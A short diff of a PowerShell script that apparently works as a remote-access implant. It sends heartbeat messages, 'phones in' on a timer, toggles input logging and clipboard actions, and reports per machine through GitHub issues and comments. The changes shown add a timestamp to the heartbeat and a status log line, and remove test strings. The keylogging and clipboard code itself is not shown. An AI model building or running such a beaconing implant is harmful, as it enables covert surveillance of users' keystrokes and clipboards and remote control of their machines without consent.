@@ -156,8 +156,9 @@ function Start-LoopMode
         #Post heartbeat message.
         try 
         {
+            $heartbeatTimeStamp = Get-Date -Format G
             Write-Console -Message ("Posting heartbeat message...")
-            Send-Message -CommandID 6 -Body ("Heartbeat Ok.")
+            Send-Message -CommandID 6 -Body ($heartbeatTimeStamp + ": Heartbeat Ok.")
             Write-Console -Message ("Posted.")
         }
         catch 
@@ -496,6 +497,8 @@ function Start-LoopMode
         $waitTime = 60
         Write-Host "For debugging purposes the wait time has been set."
 
+        Write-Console -Message ("About to enter waiting state with input logging set to " + $enableInputLogging + " and clipboard actions set to " + $enableClipboardActions + ". Next phone-in set to occur in " + $waitTime + " minutes.")
+        
         try
         {
             If($uploadConsole)
@@ -535,7 +538,7 @@ function Start-LoopMode
 
         #Waiting loop
         $timer = [Diagnostics.Stopwatch]::StartNew()
-        Write-Console -Message ("Timer started. Entering waiting state.")
+        Write-Console -Message ("Timer started.")
         While($timer.Elapsed.TotalMinutes -lt $waitTime)
         {
             #Put a short sleep here to avoid hammering the CPU
@@ -614,7 +617,7 @@ function Start-LoopMode
 #ENTRY POINT
 
 $script:debugMode = $True
-$script:consoleLog = "TEST CONSOLE LOG - FIRST MESSAGE"
+$script:consoleLog = ""
 Write-Console -Message ("Program starting with debug mode set to " + $debugMode + ".")
 
 #Check to see if powershell is already running.  If it is, exit the script. This will prevent the script from rendering powershell unusable on the computer.
@@ -797,8 +800,6 @@ try
             Write-Console -Message ("Issue creation failed. Unable to find an issue associated with this machine.")
 			Exit
         }
-        
-        New-GitHubComment -OwnerName $GitHubUserName -RepositoryName $repositoryName -Issue $issueNumber -Body "Testing123"
 	}
 }
 catch
